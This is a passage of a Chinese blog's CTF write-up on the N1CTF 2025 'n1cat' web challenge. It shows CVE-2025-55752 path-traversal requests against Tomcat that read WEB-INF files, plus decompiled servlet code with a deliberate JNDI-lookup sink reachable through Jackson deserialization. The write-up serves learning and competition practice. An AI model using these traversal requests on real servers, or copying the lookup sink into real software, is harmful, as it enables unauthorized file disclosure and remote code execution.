@@ -1,0 +1,832 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/myavatar.jpg">
+  <link rel="icon" href="/img/myavatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="5i1encee">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="对题目的复现以及对高版本JDK下的Spring原生反序列化链的学习研究">
+<meta property="og:type" content="article">
+<meta property="og:title" content="N1CTF 2025 n1cat 复现">
+<meta property="og:url" content="http://5i1encee.top/2026/01/05/N1CTF%202025%20n1cat%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="5i1encee&#39;s Blog">
+<meta property="og:description" content="对题目的复现以及对高版本JDK下的Spring原生反序列化链的学习研究">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://5i1encee.top/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/n1ctf2025.png">
+<meta property="article:published_time" content="2026-01-05T09:19:55.000Z">
+<meta property="article:modified_time" content="2026-01-06T09:30:58.096Z">
+<meta property="article:author" content="5i1encee">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="高版本利用">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://5i1encee.top/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/n1ctf2025.png">
+  
+  
+  
+  <title>N1CTF 2025 n1cat 复现 - 5i1encee&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"5i1encee.top","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"jjGGn76maTdishPRDEFNvls9-gzGzoHsz","app_key":"FJ9un1wEMLCu0LBShqweCwNF","server_url":"https://jjggn76m.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>5i1encee</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/N1CTF2025n1cat%E5%A4%8D%E7%8E%B0/n1ctf2025.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="N1CTF 2025 n1cat 复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        5i1encee
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-05 17:19" pubdate>
+          2026年1月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">N1CTF 2025 n1cat 复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="N1CTF-2025-n1cat-复现"><a href="#N1CTF-2025-n1cat-复现" class="headerlink" title="N1CTF 2025 n1cat 复现"></a>N1CTF 2025 n1cat 复现</h1><p>web 部分官方 WP<a target="_blank" rel="noopener" href="https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/">https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/</a></p>
+<p>官方仓库 <a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2025">https://github.com/Nu1LCTF/n1ctf-2025</a></p>
+<h1 id="n1cat"><a href="#n1cat" class="headerlink" title="n1cat"></a>n1cat</h1><p>题目提供附件 rewrite.config</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">RewriteCond %&#123;QUERY_STRING&#125; (^|&amp;)path=([^&amp;]+)<br>RewriteRule ^/download$ /%2 [B,L]<br></code></pre></td></tr></table></figure>
+
+<p>结合 Tomcat 版本 9.0.108 进行检索可以发现 CVE-2025-55752，通过 <code>/download?path=%2fWEB-INF%2fweb.xml</code> 可以找到 web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>welcomeServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>ctf.n1cat.welcomeServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>welcomeServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>从中确定 ctf.n1cat.welcomeServlet 而后就是使用 CVE-2025-55752 继续探测获取信息</p>
+<p><code>/download?path=%2fWEB-INF/classes/ctf/n1cat/welcomeServlet.class</code> 这里又可以看到 User.class，且使用了 Jackson</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ctf.n1cat;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ObjectNode;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-meta">@WebServlet(name = &quot;welcomeServlet&quot;, value = &#123;&quot;/&quot;&#125;)</span><br><span class="hljs-comment">/* loaded from: welcomeServlet.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">welcomeServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String _DEFAULT_NAME _= <span class="hljs-string">&quot;guest&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String _DEFAULT_WORD _= <span class="hljs-string">&quot;welcome&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ObjectMapper _OBJECT_MAPPER _= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">contextPath</span> <span class="hljs-operator">=</span> request.getContextPath();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pathWithinApp</span> <span class="hljs-operator">=</span> requestUri.substring(contextPath.length());<br>        <span class="hljs-keyword">if</span> (shouldDelegate(pathWithinApp)) &#123;<br>            delegateToDefaultResource(pathWithinApp, request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonPayload</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;json&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nameParam</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">wordParam</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;word&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">urlParam</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        <span class="hljs-keyword">if</span> (isBlank(jsonPayload) &amp;&amp; !isBlank(nameParam) &amp;&amp; !isBlank(wordParam)) &#123;<br>            <span class="hljs-type">ObjectNode</span> <span class="hljs-variable">composed</span> <span class="hljs-operator">=</span> _OBJECT_MAPPER_.createObjectNode();<br>            composed.put(<span class="hljs-string">&quot;name&quot;</span>, nameParam);<br>            composed.put(<span class="hljs-string">&quot;word&quot;</span>, wordParam);<br>            <span class="hljs-keyword">if</span> (!isBlank(urlParam)) &#123;<br>                composed.put(<span class="hljs-string">&quot;url&quot;</span>, urlParam);<br>            &#125;<br>            jsonPayload = composed.toString();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (isBlank(jsonPayload)) &#123;<br>            response.sendRedirect(defaultRedirectTarget(request));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) _OBJECT_MAPPER_.readValue(jsonPayload, User.class);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">word</span> <span class="hljs-operator">=</span> user.getWord();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> user.getUrl();<br>            <span class="hljs-keyword">if</span> (isBlank(name) || isBlank(word)) &#123;<br>                response.sendRedirect(defaultRedirectTarget(request));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                renderResponse(response, name, word, url);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException e) &#123;<br>            response.sendError(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid user data&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (JsonProcessingException e2) &#123;<br>            response.sendError(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid JSON payload&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldDelegate</span><span class="hljs-params">(String pathWithinApp)</span> &#123;<br>        <span class="hljs-keyword">return</span> (pathWithinApp == <span class="hljs-literal">null</span> || pathWithinApp.isEmpty() || <span class="hljs-string">&quot;/&quot;</span>.equals(pathWithinApp)) ? <span class="hljs-literal">false</span> : <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delegateToDefaultResource</span><span class="hljs-params">(String pathWithinApp, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">RequestDispatcher</span> <span class="hljs-variable">defaultDispatcher</span> <span class="hljs-operator">=</span> getServletContext().getNamedDispatcher(<span class="hljs-string">&quot;default&quot;</span>);<br>        <span class="hljs-keyword">if</span> (defaultDispatcher != <span class="hljs-literal">null</span>) &#123;<br>            defaultDispatcher.forward(request, response);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            request.getRequestDispatcher(pathWithinApp).forward(request, response);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderResponse</span><span class="hljs-params">(HttpServletResponse response, String name, String word, String url)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-keyword">try</span> &#123;<br>            out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>            out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + escapeHtml(name) + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>            out.println(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span> + escapeHtml(word) + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!isBlank(url)) &#123;<br>                out.println(<span class="hljs-string">&quot;&lt;p&gt;URL: &quot;</span> + escapeHtml(url) + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>);<br>            &#125;<br>            out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>            <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span>) &#123;<br>                out.close();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable th) &#123;<br>            <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable th2) &#123;<br>                    th.addSuppressed(th2);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">throw</span> th;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">escapeHtml</span><span class="hljs-params">(String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> input.replace(<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;&amp;amp;&quot;</span>).replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&amp;lt;&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&amp;gt;&quot;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&amp;quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&amp;#x27;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">defaultRedirectTarget</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-keyword">return</span> request.getContextPath() + <span class="hljs-string">&quot;/?name=&quot;</span> + urlEncode(_DEFAULT_NAME_) + <span class="hljs-string">&quot;&amp;word=&quot;</span> + urlEncode(_DEFAULT_WORD_);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBlank</span><span class="hljs-params">(String value)</span> &#123;<br>        <span class="hljs-keyword">return</span> value == <span class="hljs-literal">null</span> || value.trim().isEmpty();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">urlEncode</span><span class="hljs-params">(String value)</span> &#123;<br>        <span class="hljs-keyword">return</span> URLEncoder._encode_(value, StandardCharsets._UTF_8_);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>/download?path=%2fWEB-INF/classes/ctf/n1cat/User.class</code> 继续获取 User.class，这里 setUrl 直接就会使用 lookup，推测为 Jackson 反序列化 +JNDI 注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ctf.n1cat;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-comment">/* loaded from: User.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String word;<br>    <span class="hljs-keyword">private</span> String url;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getWord</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.word;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWord</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.word = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUrl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.url;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUrl</span><span class="hljs-params">(String url)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(url);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>((Throwable) e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>/download?path=%2fMETA-INF/MANIFEST.MF</code> 这里可以看构建时使用的 jdk 版本：Oracle OpenJDK 17.0.4</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Manifest-Version: <span class="hljs-number">1.0</span><br>Created-By: IntelliJ IDEA<br>Built-By: gsbp<br>Build-Jdk: Oracle OpenJDK <span class="hljs-number">17.0</span><span class="hljs-number">.4</span> - aarch64<br></code></pre></td></tr></table></figure>
+
